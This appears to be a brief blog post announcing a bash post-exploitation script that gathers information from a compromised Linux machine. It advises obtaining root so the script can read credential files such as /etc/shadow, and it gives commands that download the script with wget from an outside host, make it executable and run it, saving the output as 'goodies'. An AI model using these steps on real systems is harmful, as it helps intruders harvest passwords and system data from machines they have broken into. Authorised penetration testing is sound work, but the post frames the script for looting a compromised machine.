Gathering useful information from Linux box after exploiting it can be a lengthily and tedious task.
To help automate some of this process I've created a post exploitation script in bash which will gather most of the useful information for you. I still strongly suggest conducting a thorough manual investigation.

For best results try to obtain root privileges before running the script as you'll need this to access files such as /etc/shadow

cd /
wget http://your.box/linux_post.sh
chmod 755 linux_post.sh
./linux_post.sh > goodies.txt
{% endhighlight %}
